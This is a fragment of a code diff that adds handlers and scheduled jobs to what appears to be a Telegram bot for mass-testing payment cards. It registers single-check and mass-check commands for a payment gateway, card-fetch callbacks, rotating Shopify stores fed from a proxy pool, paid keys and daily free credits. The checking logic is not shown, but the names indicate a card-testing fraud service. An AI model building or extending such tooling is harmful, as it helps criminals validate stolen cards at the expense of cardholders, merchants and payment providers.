     app.add_handler(CommandHandler("jhit", jhit_command))
+    # PayGlocal is SINGLE-check only now — /mpgl was removed.
+    app.add_handler(CommandHandler("pgl", single_check_payglocal_lite))
+    app.add_handler(CommandHandler("addpgl", addpgl_command))
     
     app.add_handler(CommandHandler("chkadd", chkadd_command))
     app.add_handler(CommandHandler("chkadd_enhanced", chkadd_command_enhanced))
@@ -93313,6 +95155,9 @@ def main():
     app.add_handler(CallbackQueryHandler(verify_membership_callback, pattern='^verify_membership$'))
     app.add_handler(CallbackQueryHandler(autosopi_get_cards_callback, pattern="^autosopi_get_"))
     app.add_handler(CallbackQueryHandler(mass_check_stop_callback, pattern="^mcstop_"))
+    # /pgl + /jhit single-check controls
+    app.add_handler(CallbackQueryHandler(sc_cancel_callback, pattern="^sccancel_"))
+    app.add_handler(CallbackQueryHandler(sc_real_response_callback, pattern="^scrreal_"))
     app.add_handler(CallbackQueryHandler(universal_stop_callback, pattern="^mstop_"))
     app.add_handler(CallbackQueryHandler(universal_stop_callback, pattern="^autosopi_stop_"))
     app.add_handler(CallbackQueryHandler(results_get_callback, pattern="^resget_"))
@@ -93333,6 +95178,8 @@ def main():
     if app.job_queue is not None:
         app.job_queue.run_repeating(broadcast_worker, interval=30, first=10)
         app.job_queue.run_repeating(key_expiry_worker, interval=60, first=30)
+        # Free credits: +20 every 24h per free user (checked every 5 min)
+        app.job_queue.run_repeating(daily_bonus_worker, interval=300, first=20)
         # Auto proxy test + dead-proxy cleanup, once every 24h (first run 1h after boot).
         app.job_queue.run_repeating(proxy_test_job, interval=86400, first=3600)
         # Top up the Shopify rotation from the GOOD/NORMAL backup pool whenever
